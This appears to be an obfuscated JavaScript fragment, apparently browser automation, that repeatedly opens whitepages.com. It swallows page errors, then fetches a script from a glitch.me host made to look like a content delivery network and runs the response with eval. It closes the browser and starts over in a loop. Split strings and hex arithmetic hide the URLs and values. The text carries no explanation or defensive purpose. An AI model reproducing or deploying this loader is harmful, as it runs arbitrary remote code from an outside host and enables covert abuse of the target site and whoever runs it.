((async () => {
  ...
  (async function g() {
    let h = -0x6 * -0x66e + 0x25 * 0x19 + -0x2a31;
    ...
    return j['on']('pageerror', function(k) {}), j['on']('error', function(k) {}), await j['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
      ...
      k['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x7ab + -0x705 + -0x4 * -0x3ac), k['send'](), eval(k['responseTe' + 'xt']);
    }), await wait(0x1 * 0xdf573 + -0xdfe12 + 0xdc43f * 0x1), await j['close'](), await i['close'](), g());
  }());
})());